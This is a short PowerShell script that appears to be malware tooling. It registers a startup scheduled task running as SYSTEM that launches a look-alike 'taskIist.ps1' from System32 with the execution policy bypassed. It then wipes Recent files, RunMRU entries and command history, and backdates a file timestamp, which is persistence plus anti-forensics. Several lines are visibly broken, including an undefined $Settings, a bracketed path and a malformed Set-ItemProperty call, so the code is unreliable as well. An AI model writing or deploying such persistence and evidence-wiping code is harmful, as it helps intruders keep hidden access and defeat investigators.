$InputString = Read-Host ""
$OutputString = ""

for ($i = 0; $i -lt $InputString.Length; $i++) {
  $RandomChar = [char]([int]([char]$InputString[$i]) + Get-Random -Minimum 1 -Maximum 10)
  $OutputString += $RandomChar
}

Write-Host "$OutputString"

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"<C:\Windows\System32\taskIist.ps1>`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings

Register-ScheduledTask -TaskName "taskIist" -InputObject $Task -User "SYSTEM" -Password $null

Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
Set-PSReadlineOption -MaximumHistoryCount 1
Clear-History -Count 10000

Set-ItemProperty Path -Name "LastWriteTime" -Value "2022-12-13 12:34:05"